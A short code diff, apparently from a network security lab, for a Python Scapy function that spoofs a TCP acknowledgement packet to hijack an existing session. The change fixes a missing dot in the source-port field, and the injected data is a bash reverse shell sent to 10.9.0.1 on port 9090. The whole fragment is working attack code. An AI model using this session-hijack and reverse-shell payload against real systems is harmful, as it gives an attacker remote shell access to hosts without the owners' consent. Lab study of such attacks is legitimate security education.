@@ -4,7 +4,7 @@ def spoof_tcp (pkt) :
   IPLayer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
   TCPLayer = TCP(flags="A" ,
   seq=pkt [TCP].ack,ack=pkt[TCP].seq,
-  dport=pkt[TCP].sport, sport=pkt [TCP] dport)
+  dport=pkt[TCP].sport, sport=pkt [TCP].dport)
   data= "\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
   spoofpkt = IPLayer/TCPLayer/data
   ls(spoofpkt)
